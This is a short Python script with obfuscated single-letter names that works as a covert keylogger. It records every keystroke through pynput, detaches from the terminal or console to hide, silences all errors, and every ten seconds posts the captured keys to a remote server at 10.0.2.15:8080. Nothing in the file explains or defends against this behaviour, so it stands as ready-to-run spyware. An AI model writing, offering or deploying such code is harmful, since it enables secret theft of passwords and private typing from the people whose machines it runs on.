import pynput as p, requests as r, os as o, threading as t

a = 0
b = []
c = 10

def d(e):
    global b, a
    if e == p.keyboard.Key.enter:
        b.append('\n')
    elif e == p.keyboard.Key.space:
        b.append(' ')
    elif isinstance(e, p.keyboard.Key):
        b.append(f'<{e.name}>')
    else:
        b.append(e.char)
    a += 1

def f():
    global b
    if b:
        g = {"keys": ''.join(b)}
        try:
            r.post("http://10.0.2.15:8080", data=g)
        except:
            pass
        b = []
    t.Timer(c, f).start()

def h(i):
    if i == p.keyboard.Key.esc:
        return False

def j():
    with p.keyboard.Listener(on_press=d, on_release=h) as k:
        k.join()

if __name__ == "__main__":
    try:
        if o.name == 'posix':
            if o.fork():
                o._exit(0)
        elif o.name == 'nt':
            from ctypes import windll as l
            l.kernel32.FreeConsole()

        f()
        j()
    except:
        pass

